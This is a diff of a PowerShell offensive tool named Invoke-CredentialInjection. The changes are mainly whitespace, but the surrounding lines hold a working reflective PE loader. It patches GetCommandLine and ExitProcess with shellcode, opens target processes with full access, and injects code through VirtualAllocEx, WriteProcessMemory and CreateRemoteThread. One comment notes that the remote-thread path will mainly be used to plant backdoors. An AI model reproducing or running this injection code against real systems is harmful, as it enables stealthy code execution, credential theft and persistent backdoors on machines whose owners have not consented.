@@ -2017,29 +2017,29 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [System.Object]
 		    $PEInfo,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Functions,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Constants,
-		
+
 		    [Parameter(Position = 3, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Types
 		    )
-		
+
 		    for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
 		    {
 			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
 			    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
 			    [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
-			
+
 			    [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
 			    [UInt32]$SectionSize = $SectionHeader.VirtualSize
-			
+
 			    [UInt32]$OldProtectFlag = 0
 			    Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
 			    $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
@@ -2049,7 +2049,7 @@ function Invoke-CredentialInjection
 			    }
 		    }
 	    }
-	
+
 	    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
 	    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
 	    Function Update-ExeFunctions
@@ -2058,36 +2058,36 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [System.Object]
 		    $PEInfo,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Functions,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Constants,
-		
+
 		    [Parameter(Position = 3, Mandatory = $true)]
 		    [String]
 		    $ExeArguments,
-		
+
 		    [Parameter(Position = 4, Mandatory = $true)]
 		    [IntPtr]
 		    $ExeDoneBytePtr
 		    )
-		
+
 		    #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
-		    $ReturnArray = @() 
-		
+		    $ReturnArray = @()
+
 		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		    [UInt32]$OldProtectFlag = 0
-		
+
 		    [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
 		    if ($Kernel32Handle -eq [IntPtr]::Zero)
 		    {
 			    throw "Kernel32 handle null"
 		    }
-		
+
 		    [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
 		    if ($KernelBaseHandle -eq [IntPtr]::Zero)
 		    {
@@ -2099,7 +2099,7 @@ function Invoke-CredentialInjection
 		    #	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
 		    $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
 		    $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
-	
+
 		    [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
 		    [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")
 
@@ -2115,11 +2115,11 @@ function Invoke-CredentialInjection
 			    $Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
 		    }
 		    $Shellcode1 += 0xb8
-		
+
 		    [Byte[]]$Shellcode2 = @(0xc3)
 		    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
-		
-		
+
+
 		    #Make copy of GetCommandLineA and GetCommandLineW
 		    $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
 		    $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
@@ -2135,17 +2135,17 @@ function Invoke-CredentialInjection
 		    {
 			    throw "Call to VirtualProtect failed"
 		    }
-		
+
 		    $GetCommandLineAAddrTemp = $GetCommandLineAAddr
 		    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
 		    $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
 		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
 		    $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
 		    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
-		
+
 		    $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
-		
-		
+
+
 		    #Overwrite GetCommandLineW
 		    [UInt32]$OldProtectFlag = 0
 		    $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
@@ -2153,18 +2153,18 @@ function Invoke-CredentialInjection
 		    {
 			    throw "Call to VirtualProtect failed"
 		    }
-		
+
 		    $GetCommandLineWAddrTemp = $GetCommandLineWAddr
 		    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
 		    $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
 		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
 		    $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
 		    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
-		
+
 		    $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		    #################################################
-		
-		
+
+
 		    #################################################
 		    #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
 		    #	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
@@ -2172,7 +2172,7 @@ function Invoke-CredentialInjection
 		    #	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
 		    $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
 			    , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
-		
+
 		    foreach ($Dll in $DllList)
 		    {
 			    [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
@@ -2184,10 +2184,10 @@ function Invoke-CredentialInjection
 				    {
 					    "Error, couldn't find _wcmdln or _acmdln"
 				    }
-				
+
 				    $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
 				    $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
-				
+
 				    #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
 				    $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
 				    $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
@@ -2197,7 +2197,7 @@ function Invoke-CredentialInjection
 				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
 				    $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
 				    $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
-				
+
 				    $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 				    if ($Success = $false)
 				    {
@@ -2205,7 +2205,7 @@ function Invoke-CredentialInjection
 				    }
 				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
 				    $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
-				
+
 				    $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 				    if ($Success = $false)
 				    {
@@ -2216,14 +2216,14 @@ function Invoke-CredentialInjection
 			    }
 		    }
 		    #################################################
-		
-		
+
+
 		    #################################################
 		    #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.
 
 		    $ReturnArray = @()
 		    $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
-		
+
 		    #CorExitProcess (compiled in to visual studio c++)
 		    [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
 		    if ($MscoreeHandle -eq [IntPtr]::Zero)
@@ -2236,7 +2236,7 @@ function Invoke-CredentialInjection
 			    Throw "CorExitProcess address not found"
 		    }
 		    $ExitFunctions += $CorExitProcessAddr
-		
+
 		    #ExitProcess (what non-managed programs use)
 		    [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
 		    if ($ExitProcessAddr -eq [IntPtr]::Zero)
@@ -2244,7 +2244,7 @@ function Invoke-CredentialInjection
 			    Throw "ExitProcess address not found"
 		    }
 		    $ExitFunctions += $ExitProcessAddr
-		
+
 		    [UInt32]$OldProtectFlag = 0
 		    foreach ($ProcExitFunctionAddr in $ExitFunctions)
 		    {
@@ -2261,7 +2261,7 @@ function Invoke-CredentialInjection
 			    }
 			    [Byte[]]$Shellcode3 = @(0xff, 0xd3)
 			    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
-			
+
 			    [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
 			    if ($ExitThreadAddr -eq [IntPtr]::Zero)
 			    {
@@ -2273,13 +2273,13 @@ function Invoke-CredentialInjection
 			    {
 				    Throw "Call to VirtualProtect failed"
 			    }
-			
+
 			    #Make copy of original ExitProcess bytes
 			    $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
 			    $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
 			    $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
-			
-			    #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
+
+			    #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
 			    #	call ExitThread
 			    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
 			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
@@ -2297,8 +2297,8 @@ function Invoke-CredentialInjection
 
 		    Write-Output $ReturnArray
 	    }
-	
-	
+
+
 	    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
 	    #	It copies Count bytes from Source to Destination.
 	    Function Copy-ArrayOfMemAddresses
@@ -2307,11 +2307,11 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [Array[]]
 		    $CopyInfo,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Functions,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Constants
@@ -2325,9 +2325,9 @@ function Invoke-CredentialInjection
 			    {
 				    Throw "Call to VirtualProtect failed"
 			    }
-			
+
 			    $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
-			
+
 			    $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		    }
 	    }
@@ -2342,16 +2342,16 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [IntPtr]
 		    $PEHandle,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [String]
 		    $FunctionName
 		    )
-		
+
 		    $Win32Types = Get-Win32Types
 		    $Win32Constants = Get-Win32Constants
 		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
-		
+
 		    #Get the export table
 		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
 		    {
@@ -2359,7 +2359,7 @@ function Invoke-CredentialInjection
 		    }
 		    $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
 		    $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
-		
+
 		    for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
 		    {
 			    #AddressOfNames is an array of pointers to strings of the names of the functions exported
@@ -2378,7 +2378,7 @@ function Invoke-CredentialInjection
 				    return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
 			    }
 		    }
-		
+
 		    return [IntPtr]::Zero
 	    }
 
@@ -2389,29 +2389,29 @@ function Invoke-CredentialInjection
 		    [Parameter( Position = 0, Mandatory = $true )]
 		    [Byte[]]
 		    $PEBytes,
-		
+
 		    [Parameter(Position = 1, Mandatory = $false)]
 		    [String]
 		    $ExeArgs,
-		
+
 		    [Parameter(Position = 2, Mandatory = $false)]
 		    [IntPtr]
 		    $RemoteProcHandle
 		    )
-		
+
 		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
-		
+
 		    #Get Win32 constants and functions
 		    $Win32Constants = Get-Win32Constants
 		    $Win32Functions = Get-Win32Functions
 		    $Win32Types = Get-Win32Types
-		
+
 		    $RemoteLoading = $false
 		    if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
 		    {
 			    $RemoteLoading = $true
 		    }
-		
+
 		    #Get basic PE information
 		    Write-Verbose "Getting basic PE information from the file"
 		    $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
@@ -2422,8 +2422,8 @@ function Invoke-CredentialInjection
 			    Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
 			    $NXCompatible = $false
 		    }
-		
-		
+
+
 		    #Verify that the PE and the current process are the same bits (32bit or 64bit)
 		    $Process64Bit = $true
 		    if ($RemoteLoading -eq $true)
@@ -2434,19 +2434,19 @@ function Invoke-CredentialInjection
 			    {
 				    Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
 			    }
-			
+
 			    [Bool]$Wow64Process = $false
 			    $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
 			    if ($Success -eq $false)
 			    {
 				    Throw "Call to IsWow64Process failed"
 			    }
-			
+
 			    if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
 			    {
 				    $Process64Bit = $false
 			    }
-			
+
 			    #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
 			    $PowerShell64Bit = $true
 			    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
@@ -2469,11 +2469,11 @@ function Invoke-CredentialInjection
 		    {
 			    Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
 		    }
-		
+
 
 		    #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
 		    Write-Verbose "Allocating memory for the PE and write its headers to memory"
-		
+
 		    [IntPtr]$LoadAddr = [IntPtr]::Zero
 		    if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
 		    {
@@ -2487,7 +2487,7 @@ function Invoke-CredentialInjection
 		    {
 			    #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
 			    $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
-			
+
 			    #todo, error handling needs to delete this memory if an error happens along the way
 			    $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 			    if ($EffectivePEHandle -eq [IntPtr]::Zero)
@@ -2507,33 +2507,33 @@ function Invoke-CredentialInjection
 			    }
 			    $EffectivePEHandle = $PEHandle
 		    }
-		
+
 		    [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
 		    if ($PEHandle -eq [IntPtr]::Zero)
-		    { 
+		    {
 			    Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
-		    }		
+		    }
 		    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
-		
-		
+
+
 		    #Now that the PE is in memory, get more detailed information about it
 		    Write-Verbose "Getting detailed PE information from the headers loaded in memory"
 		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
 		    Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
-		
-		
+
+
 		    #Copy each section from the PE in to memory
 		    Write-Verbose "Copy PE sections in to memory"
 		    Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
-		
-		
+
+
 		    #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
 		    Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
 		    Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
 
-		
+
 		    #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
 		    Write-Verbose "Import DLL's needed by the PE we are loading"
 		    if ($RemoteLoading -eq $true)
@@ -2544,8 +2544,8 @@ function Invoke-CredentialInjection
 		    {
 			    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
 		    }
-		
-		
+
+
 		    #Update the memory protection flags for all the memory just allocated
 		    if ($RemoteLoading -eq $false)
 		    {
@@ -2563,8 +2563,8 @@ function Invoke-CredentialInjection
 		    {
 			    Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
 		    }
-		
-		
+
+
 		    #If remote loading, copy the DLL in to remote process memory
 		    if ($RemoteLoading -eq $true)
 		    {
@@ -2575,8 +2575,8 @@ function Invoke-CredentialInjection
 				    Throw "Unable to write shellcode to remote process memory."
 			    }
 		    }
-		
-		
+
+
 		    #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
 		    if ($PEInfo.FileType -ieq "DLL")
 		    {
@@ -2586,13 +2586,13 @@ function Invoke-CredentialInjection
 				    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 				    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
 				    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
-				
+
 				    $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
 			    }
 			    else
 			    {
 				    $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
-			
+
 				    if ($PEInfo.PE64Bit -eq $true)
 				    {
 					    #Shellcode: CallDllMain.asm
@@ -2610,7 +2610,7 @@ function Invoke-CredentialInjection
 				    $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
 				    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
 				    $SCPSMemOriginal = $SCPSMem
-				
+
 				    Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
 				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
 				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
@@ -2621,13 +2621,13 @@ function Invoke-CredentialInjection
 				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
 				    Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
 				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
-				
+
 				    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 				    if ($RSCAddr -eq [IntPtr]::Zero)
 				    {
 					    Throw "Unable to allocate memory in the remote process for shellcode"
 				    }
-				
+
 				    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
 				    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
 				    {
@@ -2640,7 +2640,7 @@ function Invoke-CredentialInjection
 				    {
 					    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
 				    }
-				
+
 				    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
 			    }
 		    }
@@ -2673,11 +2673,11 @@ function Invoke-CredentialInjection
 				    }
 			    }
 		    }
-		
+
 		    return @($PEInfo.PEHandle, $EffectivePEHandle)
 	    }
-	
-	
+
+
 	    Function Invoke-MemoryFreeLibrary
 	    {
 		    Param(
@@ -2685,23 +2685,23 @@ function Invoke-CredentialInjection
 		    [IntPtr]
 		    $PEHandle
 		    )
-		
+
 		    #Get Win32 constants and functions
 		    $Win32Constants = Get-Win32Constants
 		    $Win32Functions = Get-Win32Functions
 		    $Win32Types = Get-Win32Types
-		
+
 		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
-		
+
 		    #Call FreeLibrary for all the imports of the DLL
 		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
 		    {
 			    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
-			
+
 			    while ($true)
 			    {
 				    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
-				
+
 				    #If the structure is null, it signals that this is the end of the array
 				    if ($ImportDescriptor.Characteristics -eq 0 `
 						    -and $ImportDescriptor.FirstThunk -eq 0 `
@@ -2720,26 +2720,26 @@ function Invoke-CredentialInjection
 				    {
 					    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
 				    }
-				
+
 				    $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
 				    if ($Success -eq $false)
 				    {
 					    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
 				    }
-				
+
 				    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
 			    }
 		    }
-		
+
 		    #Call DllMain with process detach
 		    Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
 		    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 		    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
 		    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
-		
+
 		    $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
-		
-		
+
+
 		    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
 		    if ($Success -eq $false)
 		    {
@@ -2753,9 +2753,9 @@ function Invoke-CredentialInjection
 		    $Win32Functions = Get-Win32Functions
 		    $Win32Types = Get-Win32Types
 		    $Win32Constants =  Get-Win32Constants
-		
+
 		    $RemoteProcHandle = [IntPtr]::Zero
-	
+
 		    #If a remote process to inject in to is specified, get a handle to it
 		    if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
 		    {
@@ -2779,15 +2779,15 @@ function Invoke-CredentialInjection
 				    $ProcId = $Processes[0].ID
 			    }
 		    }
-		
+
 		    #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
 		    #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
     #		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
     #		{
     #			Write-Verbose "Getting SeDebugPrivilege"
     #			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
-    #		}	
-		
+    #		}
+
 		    if (($ProcId -ne $null) -and ($ProcId -ne 0))
 		    {
 			    $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
@@ -2795,10 +2795,10 @@ function Invoke-CredentialInjection
 			    {
 				    Throw "Couldn't obtain the handle for process ID: $ProcId"
 			    }
-			
+
 			    Write-Verbose "Got the handle for the remote process to inject in to"
 		    }
-		
+
 
 		    #Load the PE reflectively
 		    Write-Verbose "Calling Invoke-MemoryLoadLibrary"
@@ -2815,11 +2815,11 @@ function Invoke-CredentialInjection
 		    {
 			    Throw "Unable to load PE, handle returned is NULL"
 		    }
-		
+
 		    $PEHandle = $PELoadedInfo[0]
 		    $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
-		
-		
+
+
 		    #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
 		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		    if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
@@ -2881,14 +2881,14 @@ function Invoke-CredentialInjection
 			    {
 				    Throw "VoidFunc couldn't be found in the DLL"
 			    }
-			
+
 			    $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
 			    $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
-			
+
 			    #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
 			    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
 		    }
-		
+
 		    #Don't free a library if it is injected in a remote process
 		    if ($RemoteProcHandle -eq [IntPtr]::Zero)
 		    {
